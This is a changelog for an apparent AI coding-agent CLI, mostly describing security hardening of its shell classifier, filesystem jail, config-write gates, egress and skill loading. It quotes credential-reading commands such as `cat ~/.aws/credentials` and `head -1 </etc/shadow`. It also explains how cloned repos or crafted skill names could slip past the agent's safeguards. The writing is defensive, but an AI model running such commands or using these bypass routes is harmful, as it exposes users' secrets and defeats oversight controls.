  are keyed on it) while the detected id is carried to the loop and the provider. The config file is
  never rewritten by detection.
- **Three failure causes, reported distinctly.** Unreachable (`could not be reached`), reachable with
  nothing loaded (`has no model loaded — load one on the box`), and an unrecognized catalog shape are
  different problems needing different fixes; all three are non-fatal and keep the declared id.
- **`shadow local add --endpoint <url>` / `/local add --endpoint <url>`** register a LAN box in one
  command (a bare URL in the path slot works too), with `local list` showing it as a `lan endpoint`.
- The endpoint probe now ABORTS the candidate list on an unreachable host. The candidates differ only
  by a path on the same origin, so a dead host — including a black-holed route, which is what a down
  VPN looks like, since packets are dropped rather than refused — previously cost one timeout per
  candidate (4.5s) where it now costs one (1.5s), or none when the host actively refuses.

### Fixed — deep-review hardening (26 defects)

- **Filesystem jail**: `..` was collapsed lexically BEFORE the symlink walk, so `<ws>/link/../out/x`
  was judged inside while the OS opened a file outside. Resolution is now physical, component by
  component.
- **Shell classifier**: input redirection was invisible to the operand scan, so `head -1 </etc/shadow`
  auto-ran at the default autonomy; the session/prefix-grant path scoped only commands whose operands
  are files by definition, so one `(s)` grant rode `bash -c 'cat ~/.aws/credentials'`, `cp`, `tar`
  and `python3 -c` out of the jail. Both closed, plus `2>&1` is no longer misread as two commands.
- **Config-write gate**: `.shadow/config.json` (the natural relative spelling) and a case-variant
  `~/.SHADOW/CONFIG.JSON` both bypassed the prompt; relative paths are now resolved against the
  workspace the write lands in.
- **Permissions**: a `deny`/`ask` rule whose regex does not compile was a silent no-op while
  `/permissions list` showed it as active. It now fails closed, and `/permissions add` refuses the
  pattern at write time.
- **Redaction**: a shared object reference was returned RAW on every visit after the first (the cycle
  guard could not tell a DAG from a cycle), and PEM private-key blocks and bare AWS secret access
  keys were never matched. A rotated subscription token is now registered too.
- **Read-before-edit guard** was per-`AgentLoop`, i.e. per user message, so a file read in one turn
  was refused in the next ("read it in this conversation first" — for a read that had just happened),
  and the stale-file mtime check did not survive the turn boundary. Now session-scoped, alongside the
  approval grants that were fixed the same way.
- **`apply_patch`** wrote files without marking them seen, so its own output could not then be edited
  or deleted.
- **`edit_file`**: an empty `old_string` with `replace_all` rewrote every blank line in the file and
  dropped the trailing newline; a multi-line `old_string` copied WITH its trailing newline could
  never match (a phantom blank line in the line-based ladder).
- **`run_shell`** left the child's stdin an open pipe, so `cat`, `read`, a bare `python`/`node`, `ssh`
  and `npm login` blocked for the full timeout and reported a misleading "timed out".
- **Text tool-call recovery** was O(n³) in the length of the text: a degenerate repetition reply —
  the classic weak/quantized-model failure — cost 41s at 30 KB and 149s at 45 KB, freezing the
  session with no output. Now a single pass (the same inputs finish in about a millisecond).
- **Providers**: tool-call arguments sent as a JSON OBJECT (Ollama and several compatible servers) were
  silently dropped as `input: {}` on the SSE wire and threw `raw.trim is not a function` on the
  non-stream wire; the non-stream path also emitted nameless calls as `unknown tool:` and let
  `finish_reason: "stop"` override a `tool_use` inference. Undici's fixed 300s body deadline silently
  capped any longer configured idle budget — a user who raised it to 600s got an opaque `terminated`
  at 300s, and the setting could never take effect.
- **TUI input**: terminals batch keypresses into one stdin read, and Ink dispatches a single keypress
  for the whole chunk — so typed text followed by a key inserted that key's parameter bytes into the
  draft (`abc[D` became `"abc[D"`) and lost the key. Text after a paste's closing marker in the
  same read was discarded. Vim's `a` stepped one UTF-16 unit, splitting emoji surrogate pairs.
- **TUI render**: the live-slot reserve collapsed during the think and tool phases and returned at the
  first text delta, moving the composer mid-turn; `indexOf`-based tab measurement made every character
  after a tab short by 1–7 columns; Ctrl-T reflowed the entire transcript for a one-line live toggle;
  the composer painted and measured at two different widths below 20 columns; and prompt history grew
  unbounded.
- **LSP**: after a server restart the service sent `didChange` for documents the new instance had never
  been `didOpen`-ed — a protocol violation that silently ended diagnostics for that file for the rest
  of the session and made every later write wait out the full deadline.
- **Retention** protected the newest by FILENAME, and letters collate after digits, so a stale
  imported `claude-*.jsonl` was pinned as newest while the genuinely newest ISO log was archived.

## [8.6.0] — 2026-09-05

Combined release: the web console becomes a proper endpoint harness (discover, verify, pin and
promote inference endpoints without leaving the browser), saved connections become editable and
testable in place, the terminal composer gains source-faithful draft copying and display-column
navigation, and self-hosted setup gets a first-class guide plus a no-network doctor check.

### Added — web endpoint harness

- **Endpoints pane** (settings modal, `src/web/ui/endpointsPane.js`): discover and verify API +
  self-hosted inference servers BEFORE a preset exists — the complement of the Models pane's
  per-preset tests, which verify a SAVED preset.
- **Pinned permanent hosts with a port-resolver doctor** (`/api/endpoints/known`,
  `/api/endpoints/resolve`): pin a box whose port may change; on pane load and on every Resolve
  the server probes the inference-port allowlist and reports whatever is running now — backend,
  latency, served models with per-model context windows.
- **Manual probe + curated quick-picks** (`/api/endpoints/probe`, `/api/endpoints/quickpicks`):
  Ollama, llama.cpp, vLLM, LM Studio and SGLang in one click; typed `errorKind` results with
  human hints (a transposed WireGuard octet routes out the wrong interface and silently times
  out — the copy says so).
- **Opt-in bounded LAN scan** (`/api/endpoints/scan`): private /24s derived from interface
  octets — WireGuard /32 tunnels included — known inference ports only, never a port sweep;
  host cap + 8s deadline, hosts interleaved round-robin so the target list is covered evenly
  before the cap.
- **Every probe flows through the egress chokepoint**: server-side `shadowFetch`
  (`purpose: 'local-probe'`) inherits the offline wall and cloud-metadata blocking; a cascade
  early-out makes a dead host cost one timeout instead of one per candidate path (regression-
  tested); credentials resolve server-side and never cross the wire; the browser stays inside
  `connect-src 'self'`.
- **"Use as active" promotion** reuses the only config-write path (`POST /api/models` →
  `PATCH` default, with a 409 duplicate-label fallback) — promotion is always an explicit click.

### Added — connection settings & tests (web)

- **Edit a preset in place**: change model ID, endpoint or key without deleting it; a blank
  replacement key keeps the current one; changing an endpoint while retaining credentials
  requires explicit confirmation.
- **Test endpoint / Test response** (`src/web/modelProbe.ts`): the endpoint test checks the
  saved endpoint's models API; the response test asks first, then sends a fixed sample prompt
  with a 64-token output limit (may cost paid tokens; no conversation history, workspace data
  or tools are sent). Single-flight per preset, 15s timeout, no redirects, no retries; keys and
  raw provider bodies never reach the browser.
- **Browser session connection UX**: a live connection-status line, composer button states that
  track the session (Send / Queue message / Stop / Sending…), and failed sends preserve the
  draft without automatic retries (a lost acknowledgement can mean the server already accepted).

### Added — composer copying & navigation (terminal)

- **Ctrl+X then C copies a draft's source text**: multi-line drafts copy with paragraphs and
  indentation preserved — no terminal gutters or soft-wrap newlines; large paste chips are
  expanded; known secrets are redacted, as with reply copying.
- **Display-column arrow navigation**: emoji and CJK are measured in terminal display columns;
  the caret stays beside the correct hard line and within the visible-row budget in short
  terminals; gutter arrows indicate text above or below the visible draft window.

### Added — self-hosting guidance

- **`docs/SELF_HOSTING.md`**: connect a model you already run — base-URL examples per runtime,
  honest model discovery, tool-calling guidance, and the doctor workflow.
- **No-network provider doctor** (`src/doctor/provider.ts`): `providerDiagnostic` inspects the
  selected provider/model, credential availability (vault-locked aware) and managed local
  backends (llama.cpp/MLX/vLLM) without contacting a model, starting a server or unlocking
  credentials — and reports endpoint origins without userinfo, query or fragment.

## [8.5.0] — 2026-09-02

Two tracks: onboarding stops making you memorize model IDs (live endpoint discovery,
allowlist picking, honest fallbacks — terminal and web wizards), and a full adversarial
deep review of `src/` landed its 25 confirmed findings (security containment gaps first).
Unverified leads from the same review are triaged in `review-backlog-deep-2026-09-02.md`.

### Added — onboarding model discovery

- **Live endpoint probe** (`src/onboard/probe.ts`): after the key, the wizard probes the
  endpoint and fetches the model IDs that account can actually use — adapter compatibility
  (OpenAI- vs Anthropic-shaped) is detected from the payload, not assumed, and local/
  self-hosted endpoints are recognized honestly (`hostingHint` for known catalog cases,
  evidence-based otherwise). You pick an allowlist plus the default; only those become
  presets in `/model`. `persistTarget.ts` grew to persist the allowlist as presets.
- **Curated fallbacks with an exact-ID escape hatch**: when `/models` is unavailable, the
  wizard shows current agentic recommendations and always accepts an exact model ID (for
  Z.ai Coding Plan the fallback is `glm-5.3` + `glm-5.3-flash`; legacy `glm-4.6` only
  appears if the live API lists it). DashScope uses live discovery when exposed, with
  exact-ID entry kept before the connection test.
- **Web onboarding parity** (`shadow onboard --web`): the same discovery + allowlist picker
  in the loopback form — the key is sent only to the endpoint you selected, and the strict
  CSP keeps the page talking to nothing else. The completion test before saving is unchanged.

### Fixed — security containment (deep review)

- **Envelope closure is per-pad-class** (`safety/envelope.ts`): a forged BEGIN/END pair with
  a DIFFERENT `=` pad than the real envelope no longer vouches for the real envelope —
  `envelopeSafeSlice` tracks the last BEGIN per pad class and only slices where every pad
  class is provably closed.
- **The config-file write gate now covers multi_edit and apply_patch** (F07-01 parity):
  `multi_edit` gated on its top-level `path`; `apply_patch` gates when any
  `*** Add/Update/Delete File:` / `*** Move to:` header names a config file. Both previously
  reached `shadow.config.json` without the F07-01 approval the single-file writes get.
- **Egress: the metadata-IP deny travels across redirects** (`safety/egress.ts`): a pinned
  lookup that re-resolves a redirect host now denies when the ANSWER is a cloud-metadata
  address (169.254.169.254 / fd00:ec2::254 …), not only when the pinned name itself is one.
- **The offline fetch wall fails CLOSED**: non-string targets (Request objects) used to slip
  the host check with an empty host and egress freely; Request targets are now resolved and
  gated like strings, and unparseable targets are denied rather than passed open.
- **Vault onboarding never shreds plaintext it has not verified**: the onboard save path
  merges legacy `credentials.json` into the vault data, re-seals, VERIFIES the sealed vault
  unlocks with the key, and only then shreds the plaintext (fresh-vault same shape). A failed
  verify keeps the plaintext — no key loss.
- **Skill index injection hardening** (`skills/loader.ts`): a directory name carrying
  control/format characters (newline, ESC, bidi/zero-width — attacker-crafted by construction
  since the name is spliced into the system-prompt index) is skipped outright; descriptions
  get the same control-class strip before the one-line fence.
- **Error bus events are terminal-escape scrubbed**: provider errors pass
  `sanitizeTerminalEscapes` before display, so a hostile endpoint cannot ride ANSI escapes
  into the transcript via an error message.
- **Atomic-write mode preservation + atomic checkpoints**: `atomicWrite` preserves 0600 on
  rewrite (mode is ignored on a pre-existing target); checkpoint `.bak` payloads are written
  tmp+rename so a torn backup can never be restored by `/rewind`.

### Fixed — robustness & correctness (deep review)

- **Tracked local servers are liveness-checked before reuse** (gguf/MLX/vLLM paths): a
  server that died is deleted from the tracker so it respawns, instead of every turn failing
  against the stale URL (and a different model on the same port still refuses cleanly).
- **Docker-backed vLLM containers are no longer orphaned**: cleanup force-removes
  `shadow-vllm-<port>` daemon-side (`docker rm -f`, bounded 5s) on stop/exit paths, since
  SIGKILLing the docker CLI never reaches the container it started — including the exit-hook
  and the 2s startup-timeout branch.
- **`shadow | tee` no longer hangs**: the headless piped-stdin branch gated on stdout, not
  stdin, so a TTY stdin + redirected stdout synchronously read fd 0 forever. Input source is
  now decided by `headlessInputSource(stdinIsTTY)` — stdin alone; TTY stdin gets the REPL.
- **`doctor --privacy` reports the endpoint a session would actually use**: the lastModel
  preset recall + `resolveBaseUrl` (env / credential baseUrl) now feed the report, instead of
  the bare config — no more warning about a host the machine never talks to. Still never
  unlocks the vault.
- **Anthropic `count_tokens` sends a valid body**: history `role:tool` turns are mapped like
  the real request (they 400'd the count) and tool schemas are converted to `input_schema`
  (forwarding the OpenAI shape 400'd EVERY call and silently degraded compaction to the
  local estimator).
- **Remote self-hosted Anthropic front-ends get the self-hosted stream budget**: the
  `selfHosted` marker rides `send()` into `streamWithRetry` (300s idle + the C4 no-re-POST
  guard on the post-idle fallback), matching OpenAIProvider.
- **Image stripping keeps tool_result siblings**: on the Anthropic wire a coalesced user
  turn can carry a tool_result beside an image; collapsing it to a string deleted the
  tool_result and terminal-400'd the turn (broken pairing). Non-text siblings now survive;
  only image parts drop.
- **Microcompaction resets the stale token floor**: clearing tool_result bodies in place
  now resets `lastActualTokens`, so the estimate reflects the shrunk history instead of
  burning a summarizer round trip on already-reclaimed context.
- **Checkpoints without an index restore nothing (honestly)**: legacy hash-named `.bak`
  files are no longer handed back as workspace paths — rewind no longer writes junk hash
  files into the repo root claiming "Restoring N file(s)".
- **MCP stdio framing survives multi-byte UTF-8 splits**: pipe chunks decode through a
  StringDecoder instead of per-chunk `toString()`, so a JSON message split across 64KB pipe
  boundaries no longer corrupts payloads or stalls requests to the timeout.
- **MCP HTTP tool results surface non-text content**: images/resources (and embedded
  resource text) map through the same mapping as stdio — an all-non-text result no longer
  comes back as bare `"ok"` with empty content.
- **Ctrl+X M reaches the model picker**: the reserved Ctrl+X arming no longer starves the
  keybinding resolver — the advertised chord (and any user-rebound `ctrl+x` chord) resolves;
  the external-editor escape is preserved.
- **Re-running a paste-chip message from history expands the chip**: consumed paste entries
  stay for the session (bounded by PASTE_CAP/prunePastes, as the registry docs always said),
  so recall + submit no longer sends the literal `[Pasted text #1 +120 lines]` placeholder
  to the model.

## [8.4.0] — 2026-08-30

The UX gap batch against opencode and OMP (`UX_GAP_REVIEW_0828.md`) — three sprints:
first-run and in-session friction (Sprint 1), editor-grade ergonomics (Sprint 2), and
Sprint 3's two L-sized builds — LSP diagnostics the Shadow way and `/goal` mission mode.

### Added — Sprint 1: first-run & in-session friction

- **First-run auto-onboard (1.1)** (`src/cli/autoOnboard.ts`): a genuine interactive first
  run with no provider configured now launches the onboard wizard itself instead of exiting
  with a hint. One-shot (`--task`) and `--repl` modes, piped stdin, and redirected stdout
  keep the stderr hint — their output is consumed by scripts. 9 tests.
- **Plan-mode runtime toggle (1.2)**: Shift+Tab toggles plan mode on/off at any time, even
  mid-turn — the old `chat:cycleMode` binding migrated to a registered handler with a
  raw-byte fallback for terminals that drop Ink's shift flag (the fallback runs BEFORE the
  bare-Tab ring). Tab keeps the autonomy cycle. The toggle flips the system-prompt block
  and notifies the HUD through the bus on every change.
- **One-key model switch (1.3)**: `Ctrl-X M` opens the fuzzy model picker from anywhere in
  the chat context — an opencode-style leader chord; `/model` stays the explicit path. The
  picker keeps emacs-style `Ctrl-P`/`Ctrl-N` navigation (OMP muscle memory) and refuses to
  open mid-turn, mirroring `/model`'s idle behavior.
- **`/export html` (1.4)** (`src/state/chatExport.ts`): the transcript exporter gained a
  standalone HTML rendering — self-contained (no external references or scripts), injected
  markup is escaped (no live `<script>` survives), sub-agent transcripts collapse into
  `<details>`, and long tool args/results trim with a "… N more chars" marker. `/export html
  [path]`; the plain `--html` flag covers the headless path.
- **Web console stable token (1.5)** (`web.token` in `src/config.ts`): a configured bearer
  token wins over the per-boot random mint, so a saved console URL keeps working across
  restarts. Validated at server start (min 16 chars, no whitespace/control characters) —
  an invalid value fails the boot, not the parse. The token is registered for redaction
  exactly like a random one, the boot block prints a one-line copy-paste join command with
  the fragment token, and `web` is in `PROJECT_UNTRUSTED_KEYS`: a cloned repo cannot pin
  the console's token. Unset → the old per-boot random behavior.
- **Docs-sync gate (1.6)** (`scripts/check-release-gate.sh`): the README "Current build"
  line must name the package.json version or the release blocks. The FIRST `vX.Y.Z` token
  on the line is authoritative — the line may recount prior versions later, and a greedy
  match would pass a stale build. Closes three releases of README rot (v8.0.2 advertised
  while 8.3.1 shipped).

### Added — Sprint 2: editor-grade ergonomics

- **Auto-format after writes (2.1)** (`src/agent/formatter.ts`): after a successful
  write/edit by the agent's file tools (`write_file`/`edit_file`/`multi_edit`/`apply_patch`),
  Shadow runs the project's detected formatter on that file — prettier, biome, ruff, gofmt,
  rustfmt, or shfmt, detected from dependencies + config presence. A formatter failure
  never fails the write; at most a one-line note joins the tool result. Config:
  `formatters.enabled` (default true) + per-extension `formatters.overrides` (including
  `"off"`); kill switch `SHADOW_NO_FORMAT=1`. Derived once in `buildLoopDeps` so headless,
  TUI, and sub-agent runs behave identically. 32 tests.
- **Claude Code session import (2.2)** (`src/state/claudeImport.ts`): `shadow resume
  --from-claude` scans `~/.claude/projects`, decodes the project dirs (cwd line first,
  dash-decoding fallback), converts every transcript into a Shadow session the existing
  reader resumes, and dedupes re-imports without ever touching the source. Malformed lines
  skip without aborting; empty transcripts fail loudly; files over 50 MB are refused. 8 tests.
- **Spend guardrails (2.3)** (`src/agent/budget.ts`): SOFT budgets beside the existing hard
  ceilings — `budget.maxSteps`, `budget.maxCostUsd`, `budget.warnRatio` (default 0.8). The
  guard warns once at the warn ratio, then pauses and asks through the approval seam (the
  request gets a real id + the interruptible settle path, so ESC/Ctrl-C breaks a stuck
  budget prompt like any other approval): "Stop" is listed FIRST and ends the run
  gracefully with everything so far kept; "Continue" grants exactly one more allowance
  window (same limits, warn re-armed). Headless runs stop cleanly at the gate. The hard
  `maxCostUSD` above stops unconditionally and is never negotiable — the deliberate
  `maxCostUSD`/`maxCostUsd` case split is flagged for a naming review in HANDOFF.md.
  15 tests.
- **tui.tsx structural budget (2.4)**: the component file accreted to 4,974 lines; the
  plan-2.4 slices were extracted to `src/tui/` — `slashMenu.ts` (slash-command menu + the
  sessions/turns/model argument pickers), `markdown.tsx` (transcript markdown renderer),
  `chrome.tsx` (status strip, chrome markers, composer paint, flat items), `headless.ts`
  (the one-shot/piped renderer), `gate.ts` (InteractiveGate), `sanitize.ts` (assistant-text
  display chain), with the transcript item types moved to `rows.ts`. tui.tsx lands at
  3,909 lines, and `test/tui-line-budget.test.ts` fails above 4,000 so it can't silently
  re-accrete. Re-exports keep the public `tui.js` surface stable; behavior suites
  (slash-arg-menus, tui-markdown, composer-wrap-polish, headless-*, tui-integration,
  composer-render, tui-render, model-picker-key) all pass unchanged.

### Added — Sprint 3.1: LSP diagnostics after writes (the Shadow way)

- **LSP notes on agent-written files** (`src/agent/lsp/`): after a successful write by
  `write_file`/`edit_file`/`multi_edit`/`apply_patch`, Shadow asks the project's language
  server for diagnostics on exactly those files (cap 4 per call) and appends a deduped,
  budget-capped note to the tool result — `[lsp: typescript] 2 errors, 1 warning in
  src/foo.ts` with `file:line:col — message (error, 2339)` lines. The tsserver adapter
  speaks its real wire split — line-delimited JSON in, Content-Length framing out (the
  framing-only version answered `success:false` forever; caught by an E2E probe against
  typescript 5.9.3, which the unit-test fakes had mirrored too faithfully to catch). The
  note NEVER fails
  the write, never wedges the turn (3 s deadline per collect; a cold server resolves
  `null` for that write and keeps warming in the background), and files outside the
  workspace are never opened. Errors+warnings only; per-turn 8k / per-session 60k note
  char budgets with a one-shot bus `finding` on exhaustion.
- **Servers** — zero install, stdio only: tsserver via the project's own
  `node_modules/typescript` (own wire adapter — tsserver is not JSON-RPC),
  `typescript-language-server`, `pyright-langserver`, `gopls`, `rust-analyzer` from PATH
  (detection only; Shadow never installs anything). Children run under `scrubbedEnv()`,
  fully unref'd, with a restart cap (2 per server per process, then disable + one
  `finding`), `shutdown` → SIGTERM → SIGKILL teardown on exit, and a 4 MiB framing resync
  cap so a garbage server can never wedge or OOM us. Config: `lsp.enabled` (default
  true), `lsp.timeoutMs`, `lsp.servers` overrides, `lsp.notes` budgets — and `lsp` is in
  `PROJECT_UNTRUSTED_KEYS`: a cloned repo cannot name commands we spawn. Kill switch
  `SHADOW_NO_LSP=1`; no-op until a server is actually detected. Fold-in sits at the loop
  seam (sibling of the shell-linter diagnostics note), so it runs AFTER auto-format and
  applies identically to headless, TUI, sub-agents, and the web console. 46 tests
  (`lsp.test.ts` 29, `lsp-service.test.ts` 12, `lsp-loop.test.ts` 5).

### Added — Sprint 3.2: `/goal` mission mode

- **`/goal` is now an orchestrator, not a prompt injection** (`src/agent/mission.ts`):
  `/goal <text>` begins a mission, enters plan mode, and starts a kickoff turn; the model
  explores, writes the plan with `plan_write` (new optional `tasks` array, max 24 —
  rendered as checkboxes in the plan file), and calls `exit_plan_mode`; on approval the
  harness seeds the tasks and the mission moves `planning → executing`. Phases
  `executing → verifying → done | failed` advance via the new `mission_update` tool
  (task statuses + evidence `detail` + phase); the mission block is pinned into EVERY
  lead-loop system prompt (the TodoList pattern — summarization-proof), with
  phase-specific instructions (planning demands a plan; verifying demands real evidence;
  done/failed demand honest reporting).
- **Mission state is harness-owned and survives everything**: sub-agents deliberately
  never see the mission block (no duplicated orchestration, no wasted context), and
  `mission_update` is inert inside a sub-agent (`ctx.nestedAgent` guard — the registry is
  shared). Autonomy is inherited from the session; no gate is softened by a mission.
- **HUD**: exactly ONE line while running (`🎯 <text> · <phase> n/m`, riding the old
  standing-goal row slot — frame budget untouched, parity-tested) and one pinned row
  when idle; phase changes toast. `/goal` prints full status, `/goal clear` ends the
  mission. `/goal` is live-safe mid-turn (SLASH_WHILE_RUNNING): the mission begins
  immediately, its kickoff turn defers to the queue.
- **Fixed — mission persistence** (rides 3.2): mission state now survives resume — it
  journals through the existing bus→sessionLog event stream (`mission` events), and
  resume rehydrates via a 64 KiB backward tail scan where the NEWEST mission event wins
  (a trailing clear clears). Before, the goal died on resume and headless sessions never
  had `/goal` at all.
- **Fixed — TUI background-agent drain**: background sub-agent results accumulated in
  the TUI's notification queue forever — only headless drained them into the model's
  context. The TUI now drains at exactly one turn-build seam (`src/tui/turnInput.ts`),
  prepending results to the next user turn; never mid-turn (a notification between an
  assistant `tool_use` and its `tool_result` permanently 400s the session). Structural
  pins enforce the single seam and headless parity. 41 tests (`mission.test.ts` 19,
  `mission-loop.test.ts` 6, `mission-hud.test.ts` 7, `mission-tui.test.ts` 4,
  `tui-bg-drain.test.ts` 5).

### Fixed — pre-deploy security hardening (8.4.0, caught by the deploy review)

- **The project's own `node_modules` typescript is no longer an auto-spawn target.** Detection
  used to run the workspace's `node_modules/typescript/lib/tsserver.js` under our node on the
  first TypeScript write — but that file is repo content, so a cloned repo could plant one and
  Shadow would execute it, default-on, with no approval (the exact drive-by class §"cloned repo"
  exists to prevent; the `lsp.servers` guard already covered repo *config*, this closed the
  repo-*content* path). Now: PATH-detected servers (`typescript-language-server`, pyright, gopls,
  rust-analyzer) spawn as before; the node_modules tsserver requires
  `"trustNodeModules": true` in the `lsp` block of GLOBAL config, and without it Shadow skips the
  server and says so once per session (`src/agent/lsp/detect.ts` `projectSourced` +
  `src/agent/lsp/service.ts`). Tests: `lsp.test.ts` detection trust matrix, `lsp-service.test.ts`
  untrusted-skip + single-notice pin.
- **Auto-format children now run with a scrubbed env** (`src/agent/formatter.ts` `defaultExec`):
  the formatter spawn (automatic after every write, PATH-resolved) inherited the FULL parent
  environment — every other child in the tree scrubs. A planted or typosquatted formatter on PATH
  would have received every provider key Shadow holds. One-line fix (`env: scrubbedEnv()`) +
  behavioral pin in `formatter.test.ts` (a planted secret never rides, PATH survives).
- **`/goal` mission un-sticking after a side-door plan-mode exit** (`src/agent/loop.ts`):
  exiting plan mode by any route other than an approved `exit_plan_mode` (Shift+Tab) while a
  mission sat in `planning` left the mission pinned on "do not implement" forever — the
  approval-gated seed never fired on that route. Plan-mode exits now latch
  (`PlanModeState.consumeUnapprovedExit()`, one-shot, consumed every turn so a stale latch
  can never flip a later mission) and the loop seeds the recorded plan and flips to
  `executing` on the very next turn. A mission begun while plan mode was never entered still
  waits in `planning` as designed. Tests: `mission-loop.test.ts` side-door + stays-planning pins.
- **Plan-mode toggle no longer drops recorded tasks** (`src/agent/planMode.ts`): `enter()`/
  `exit()` rebuilt the snapshot without `tasks`, so a plan written before a Shift+Tab cycle
  (or a `/goal` begun after `plan_write`) reached the mission seed task-less. Both directions
  now preserve them. Test: `plan-mode.test.ts`.
- **Image-only sends no longer silently drop drained background-agent results**
  (`src/tui.tsx`): the turn builder gated on `task` (the text), so a send with only an
  attachment — or an empty composer woken by a background completion — built an empty content
  array AFTER the drain had already emptied the queue: the notification was gone from both
  places. Gate is now `taskText`. Test: `tui-bg-drain.test.ts` source pin.
- **LSP note budget no longer burns the deadline after the latch** (`src/agent/lsp/index.ts`):
  a session budget already latched `exhausted` still entered the collect loop and spent up to
  the full `timeoutMs` per write for notes it would never emit. Suppressed now answers
  `null` immediately. Tests: `lsp.test.ts` budget latch.
- **Esc during an LSP note wait answers now, not at the deadline** (`client.ts` + `tsserver.ts`):
  `awaitDiagnostics` honored the abort signal only between files; a write mid-note would hold
  the turn open until `timeoutMs` expired. Both flavors check `signal.aborted` up front and
  resolve `[]` immediately.
- **`formatter.ts` no longer contains a literal NUL byte** (`\x00` escape now): a stray
  control byte in the python-args construction made git treat the whole file as binary —
  the private repo showed a renormalization warning on every diff and the public mirror sync
  would have carried a poisoned binary-diff blob. Byte-identical output, text file again.
- **Known limits (review findings F5 + stray-file deadline tax — advisory, accepted for
  8.4.0):** tsserver diagnostic events carry no round id, so a late event from the previous
  `geterr` round (the pre-edit file content) can land in the current round's note once — the
  note is advisory by design and the next write corrects it; and a written file outside the
  project's tsconfig membership never gets an error round back from tsserver, so that write
  pays the full `timeoutMs` (3 s default) before the note resolves null — bounded, write
  results unaffected.

### Fixed

- **F11-02 (1.7)**: the headless renderer withheld nothing — a raw textual tool-call
  envelope hit stdout BEFORE the loop's sniffToolCalls recovery decided its fate. It now
  applies the exact TUI contract (`src/tui/headless.ts` + `src/tui/sanitize.ts`):
  line-granular commit with the intent-suspicious tail held, sanitized at turn end or on
  stop. Extracted so headless never imports tui.tsx.
- **F10-03 (1.7)**: the `[1m]` config alias went on the wire — the API accepts only the
  BASE model id (the 1M window is granted by the `context-1m-2025-08-07` beta header, which
  fires on the alias). `stripContext1mAlias` now applies to every model id that goes on the
  wire, `count_tokens` included; stripping without the header would silently downgrade the
  context window, so the two ship together.
- Test pins updated for the 2.4 extraction: `tui-toast-gauge` now ties TOAST_INDENT to the
  imported PAGE_MARGIN (chrome.tsx) instead of a source grep; the P3-03 bare-flattenItem
  guard covers the whole extracted surface, comment-aware, exempting the definition module.
- `.claude/` (Claude Code worktree/session scratch) is eslint-ignored and git-ignored —
  a worktree's `dist/` could make the build-hygiene lint gate fail without any code change.

## [8.3.1] — 2026-08-22

### Fixed

- **Autopilot boot guard**: the instruction-file launch effect dogfood-proved itself —
  a full-App TUI render test seeded `SHADOW.md` into the private repo (and the mirror's
  scrubbed test suite did the same in its workspace). `autopilotEnabledForBoot()` now
  skips the boot effect when `NODE_TEST_CONTEXT` is set (node:test injects this itself;
  it is never present in production). The pure decide/seed functions are NOT guarded,
  so unit tests still exercise them directly against temp dirs. Full suite 2252/2252.

## [8.3.0] — 2026-08-21

### Added — self-documenting config layer + instruction-file autopilot (Claude Code / Codex parity)

- **`shadow config init`** (`src/config/configInit.ts`): seeds two strictly-additive
  artifacts into `~/.shadow/` — `config.template.md` (a documented reference for every
  knob: stream timeouts, resolution order, the `SHADOW_IDLE_MS` env override, notify,
  sandbox, egress, autonomy — plus the settings-vs-vault layout rule) and safe defaults
  (`notify: auto`, `contextBudget: 128000`, the `stream` block) into an EMPTY
  `config.json`. Existing content is never touched. Closes the "blank config" report:
  a fresh install now has a discoverable, documented configuration layer.
- **First-run hint**: the boot path prints one line on stderr when `config.json` is `{}`
  pointing at `shadow config init` — disappears once seeded; never nags again.
- **`/doctor` layout panel**: every run now renders the `~/.shadow` file set —
  `config.json`, `config.template.md`, `vault.enc`, `credentials.json` (legacy flag),
  `SHADOW.md`, `keybindings.json`, `egress.log`, `prompts/` — with status/size/mode and
  one-line guidance. The directory is self-describing.
- **Instruction-file autopilot** (`src/tui/instructionAutopilot.ts`): at launch, if no
  `SHADOW.md` / `AGENTS.md` / `CLAUDE.md` exists in the workspace → the `SHADOW.md`
  scaffold is seeded (Commands / Conventions / Hard rules, same text `/init` writes so
  the two can never drift). If `AGENTS.md`/`CLAUDE.md` are present → acknowledged via a
  T1 toast. If `SHADOW.md` is present → silent. Strictly additive, one-shot per session,
  unwritable directories report an error instead of throwing. `resolveSystem` already
  ingested the files (fenced untrusted) — this adds the launch behavior Claude Code and
  Codex provide.

Tests: 15 (config init / layout) + 16 (autopilot) + 2 (doctor layout). Full suite
2251/2251.

## [8.2.0] — 2026-08-21

### Fixed — emergency stream-resilience overhaul for self-hosted / slow endpoints

Self-hosted inference servers (llama.cpp, vLLM, MLX, SGLang — and remote proxies in front of
them) routinely pause for tens of seconds between SSE chunks: long tool-call generation, deep
prefill, queueing. Shadow's tight public-API watchdog (120s idle) fought those slow serves and
killed healthy streams — the operator saw a timeout storm instead of a patient agent. 8.2.0
rebuilds the budget resolution end to end.

- **Self-hosted-aware idle budget** (`src/provider/stream.ts`): `SELF_HOSTED_DEFAULT_IDLE_MS`
  (300s) applies whenever the endpoint is local/LAN/self-hosted (explicit `selfHosted: true`
  or URL detection); public endpoints keep the tight 120s watchdog. The idle-timeout error
  now tells the operator exactly which knobs fix it: `stream.idleTimeoutMs`, per-model
  `idleTimeoutMs`, and `$SHADOW_IDLE_MS`.
- **Top-level `stream` block** (`src/config.ts`): `idleTimeoutMs` / `firstByteTimeoutMs` /
  `retries` in ConfigSchema — closes the gap for DIRECT setups (`provider`/`model`/`baseUrl`,
  blank `models[]`) that previously had NO config knob. `loadConfig` deep-merges
  `~/.shadow/config.json` into it, so a hand-edited global `stream` block works without any
  `models[]` entry. Precedence, resolved in `entryStreamContract`: `SHADOW_IDLE_MS` env >
  per-model entry > `stream` block > self-hosted-aware default > built-in default.
- **Onboarding stamps resilience knobs** (`src/onboard/persistTarget.ts`): onboarding to a
  self-hosted/local target now stamps `idleTimeoutMs: 300000`, `firstByteTimeoutMs: 600000`,
  `streamRetries: 8` into the carrier ModelEntry — a fresh self-hosted install gets a patient
  watchdog out of the box. Catalog-declared `idleTimeoutMs` wins verbatim.
- **Legacy provider coercion**: `openai-compat` (old config value) now parses and coerces to
  `openai` in both the top-level provider and `ModelEntry` instead of rejecting the whole
  config file.

Wired through `bootstrap`, `tui.tsx`, `slash.ts`, and `index.ts`. 16 new tests in
`test/t2-stream-config.test.ts` pin every precedence tier and the self-hosted budget.
Full suite: 2221/2221.

## [8.1.0] — 2026-08-21

### Added — TUI feedback layer: transient toasts, context gauge, platform-aware hints

Silent state changes were the TUI's biggest UX gap — the operator flipped a setting or copied
the transcript and got zero acknowledgement unless a log line happened to scroll by. T1 adds a
dedicated ephemeral feedback channel that never pollutes the transcript.

